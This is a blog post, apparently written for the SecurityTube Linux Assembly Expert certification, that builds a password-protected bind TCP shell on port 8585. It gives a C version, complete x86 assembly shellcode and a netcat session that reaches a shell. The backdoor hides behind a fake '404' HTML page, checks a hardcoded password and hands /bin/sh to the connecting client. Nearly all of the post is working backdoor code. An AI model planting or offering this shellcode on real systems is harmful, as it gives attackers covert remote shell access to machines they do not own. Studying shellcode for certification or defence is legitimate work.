---
title:  "[SLAE ?] Bind TCP Shellcode with Password"
---

![Logo](/assets/images/tux-root.png)

As with the bind TCP shellcode, I've first started with a small C program to do this and analysed the system calls. The following program listens for incoming connections, prints a prompt message, reads some input and spawns a new shell if the input is equal to the password: 

```c
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
 
/* receiving password buffer size */
#define     BUFSIZE      10
 
/* Listening port */
#define     PORT         8585
 
/* Password prompt */
char prompt[] =  \
    "<html>\n"
    "<body>\n"
    " <h1>Error 404 - Try elsewhere</h1>\n"
    "\n"
    "</body>\n"
    "</html>\n";
 
char password[] = "s3cr37";
 
int main() {
    int listenfd = 0, connfd = 0;    
    int ret = 0;
    char buffer[BUFSIZE];
 
    struct sockaddr_in serv_addr;
 
    // Create an un-named socket. returns socket descriptor
    listenfd = socket(AF_INET, SOCK_STREAM, 0);
 
    memset(&serv_addr, '0', sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    serv_addr.sin_port = htons(PORT);
 
    bind(listenfd, (struct sockaddr*) &serv_addr, sizeof(serv_addr));
 
    // Listen on the created socket for maximum 1 client connection
    listen(listenfd, 1);
 
    // Sleep waiting for client requests
    connfd = accept(listenfd, (struct sockaddr*) NULL, NULL);
    printf("Created accept socket: %d\n", connfd);
 
    // Send fake prompt and wait for the password
    ret = send(connfd, prompt, strlen(prompt), 0); 
    if (-1 == ret) {
        printf("Send failed: %s\n", strerror(errno));
        return 1;
    }
 
    // Read password
    ret = recv(connfd, buffer, BUFSIZE, 0);
    if (-1 == ret) {
        printf("Recv failed: %s\n", strerror(errno));
        return 1;
    } else {
        printf("Received: %s", buffer);
    }
 
    // Compare
    if (!strncmp(buffer, password, strlen(password))){
        printf("Correct password. Opening shell...\n");    
    } else {
        close(listenfd);
        close(connfd);
        return 1;
    }
 
    // Duplicate stdin, stdout, stderr
    ret = dup2(connfd, 0);
    if (-1 == ret) {
        printf("STDIN duplication failed: %s\n", strerror(errno));
        return 1;
    }
 
    ret = dup2(connfd, 1);
    if (-1 == ret) {
        printf("STDOUT duplication failed: %s\n", strerror(errno));
        return 1;
    }
 
    ret = dup2(connfd, 2);
    if (-1 == ret) {
        printf("STDERR duplication failed: %s\n", strerror(errno));
        return 1;
    }
 
    // Replace process image
    char *args[2];
    args[0] = "/bin/sh";
    args[1] = NULL;      // Needs to ne a NULL terminated list of args
 
    ret = execve(args[0], args, NULL);
    if (-1 == ret) {
        printf("Execve failed: %s\n", strerror(errno));
        return 1;
    }
 
    return 0;
}
```

If we supply the correct password we get the shell: 
```bash
$ gcc -Wall shell_bind_tcp.c -o shell_bind_tcp
$ ./shell_bind_tcp_passw  &
[1] 4528
Created accept socket: 5
Received: s3cr37
Ź� Correct password. Opening shell...
```

And on the connecting side:
```bash
$ nc -nvv 192.168.56.1 8585
(UNKNOWN) [192.168.56.1] 8585 (?) open
 
 
<h1>
Error 404 - Try elsewhere</h1>
 
 
s3cr37
whoami
liv
```

The next step is to reproduce these system calls in assembly language and get the shellcode. This is easy to do, if we start from the previous TCP bind shellcode and add a _`recv`_ call and compare input:

```c
global _start   

section .text
_start:

    ; Linux Syscall Reference
    ; http://syscalls.kernelgrok.com/


    ; 1. socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = listenfd
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    push ecx        ; NULL terminate args list
    mov cl, 6       ; IPPROTO_TCP (6)
    push ecx
    xor ecx, ecx
    mov cl, 1       ; SOCK_STREAM (1) - in socket.h
    push ecx
    xor ecx, ecx
    mov cl, 2       ; PF_INET (2) - IP PROTO FAMILY
    push ecx
    mov ecx, esp    ; socketcall arguments
    xor ebx, ebx
    mov bl, 1       ; socketcall type of call: SYS_SOCKET (1) 
    push 102
    pop eax         ; socketcall syscall
    int 0x80
    mov edx, eax    ; listenfd is returned in eax. Save into edx    

    ; 2. bind(listenfd, {sa_family=AF_INET, sin_port=htons(4444), \
    ;       sin_addr=inet_addr("0.0.0.0")}, 16)
    ;struct sockaddr_in {
    ;    short            sin_family;   // e.g. AF_INET, AF_INET6
    ;    unsigned short   sin_port;     // e.g. htons(3490)
    ;    struct in_addr   sin_addr;     // see struct in_addr, below
    ;    char             sin_zero[8];  // zero this if you want to
    ;};
    ;struct in_addr {
    ;    unsigned long s_addr;          // load with inet_pton()
    ;};
    xor ecx, ecx    ; Construct sockaddr structure on the stack
    push ecx        ; inet_addr - 0.0.0.0 - INADDR_ANY
    push word 0x8921; 16 bits - port number (8585 decimal)
    push word 2     ; family - AF_INET (2)
    mov ecx, esp    ; pointer to args

    push byte 0x10  ; Address length - 16 bytes
    push ecx        ; Pointer to sockaddr_in structure
    push edx        ; listenfd from socket call

    mov ecx, esp    ; socketcall arguments
    xor ebx, ebx
    mov bl, 2       ; socketcall type of call: SYS_BIND (2)
    xor eax, eax
    mov al, 102     ; socketcall syscall
    int 0x80

    ; 3. listen(listenfd, 1)
    push 1          ; max connections
    push edx        ; listenfd
    mov ecx, esp    ; pointer to socketcall arguments
    push 4
    pop ebx         ; SYS_LISTEN (4)
    push 102
    pop eax         ; socketcall syscall
    int 0x80
 
    ; 4. accept(listenfd, 0, NULL) = connfd
    xor ecx, ecx
    push ecx        ; NULL
    push ecx        ; 0
    push edx        ; listenfd
    mov ecx, esp    ; pointer to socketcall arguments
    push 5
    pop ebx         ; SYS_ACCEPT = 5
    push 102
    pop eax         ; socketcall syscall
    int 0x80        ; connfd will be in eax
    mov edx, eax    ; save new connection descriptor

    ; 5. recv(connfd, buffer, BUFSIZE, 0)
    ; recv(int sockfd, void *buf, size_t len, int flags);
    xor ecx, ecx    
    push   ecx      ; flags (0)
    push   0xa      ; buffer size
    lea    ecx, [esp + 8]
    push   ecx      ; addres of buffer
    mov edi, ecx    ; save address of buffer for further comparison
    push   edx      ; sockfd
    mov    ecx, esp ; ECX - params of socket call    
    push 10
    pop ebx         ; EBX - type of socketcall - SYS_RECV (10)
    push 102
    pop eax         ; socketcall syscall
    int 0x80        ; connfd will be in eax


    ; 6. compare password
 mov ecx, 6      ; passwd len
    ; pass: s3cr37 - 73 33 63 72 33 37 
    push 0xAAAA3733
    push 0x72633373
 mov esi, esp
    ; address of buffer is already saved in edi
 repe cmpsb
 jz correct_pass
    
    ; exit()
    xor eax, eax
 mov al, 1
 xor ebx, ebx
    mov bl, 7
 int 0x80

correct_pass:
    ; 7. dup2(connfd, 2), dup2(connfd, 1), dup2(connfd, 0)
    push 2
    pop ecx         ; ecx - newfd
    mov ebx, edx    ; edx - connfd, ebx - oldfd
    dup_loop:
    mov al, 63      ; dup2 syscall
    int 0x80
    dec ecx
    jns dup_loop    ; exit when signed (-1)
      
    ; 8. execve("/bin/sh", ["/bin/sh"], [/* 0 vars */])
 ; PUSH the first null dword 
 xor eax, eax
 push eax

    ; PUSH //bin/sh (8 bytes) 
 push 0x68732f2f ; 'hs//'
 push 0x6e69622f ; 'nib/
 mov ebx, esp    ; EBX - 1st param - NULL terminated filename

 push eax        ; EDX - 3rd param - NULL terminated list of env variables
 mov edx, esp    ; NULL terminator must be set before setting the 2nd param!

 push ebx        ; ECX - 2nd param - array of argument strings
 mov ecx, esp

 mov al, 11      ; execve syscall
 int 0x80
```

##

The complete source files and scripts mentioned in this post can be found in my [SLAE Git repository](https://github.com/livz/slae).

**_This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)_**
